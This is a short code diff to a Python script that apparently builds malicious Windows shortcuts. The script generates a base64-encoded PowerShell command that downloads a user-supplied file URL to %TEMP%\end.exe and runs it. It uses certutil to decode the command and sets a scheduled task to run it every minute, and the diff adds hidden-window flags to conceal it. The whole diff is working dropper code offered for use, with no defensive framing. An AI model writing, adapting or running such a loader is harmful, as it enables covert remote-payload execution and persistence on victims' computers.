@@ -20,13 +20,13 @@ def create_shortcut(target, shortcut_name, code, working_dir=None, icon_path=Non
     
     
 def main():
-    fileurl = input('File URL (Must be a direct download) -> ')
+    fileurl = input('File URL -> ')
     
-    cmd = f"""powershell -command "IWR '{fileurl}' -OutFile '$env:TEMP\end.exe'"; Unregister-ScheduledTask -TaskName "n5dMmJEBYc"-Confirm:$false ; start $env:TEMP\end.exe"""
+    cmd = f"""powershell -command -WindowStyle hidden "IWR '{fileurl}' -OutFile '$env:TEMP\end.exe'"; Unregister-ScheduledTask -TaskName "n5dMmJEBYc"-Confirm:$false ; start $env:TEMP\end.exe"""
     
     data = base64.b64encode(cmd.encode()).decode()
     
-    cmd_commands = f'''powershell echo {data} > $env:TEMP\phase1.ps1;certutil -decode $env:TEMP\phase1.ps1 $env:TEMP\phase2.ps1; schtasks /create /f /sc minute /mo 1 /tn n5dMmJEBYc /tr \"%TEMP%\\phase2.ps1\" '''
+    cmd_commands = f'''powershell -WindowStyle hidden echo {data} > $env:TEMP\phase1.ps1;certutil -decode $env:TEMP\phase1.ps1 $env:TEMP\phase2.ps1; schtasks /create /f /sc minute /mo 1 /tn n5dMmJEBYc /tr \"%TEMP%\\phase2.ps1\" '''
     
     script_dir = os.path.dirname(os.path.abspath(__file__))
     
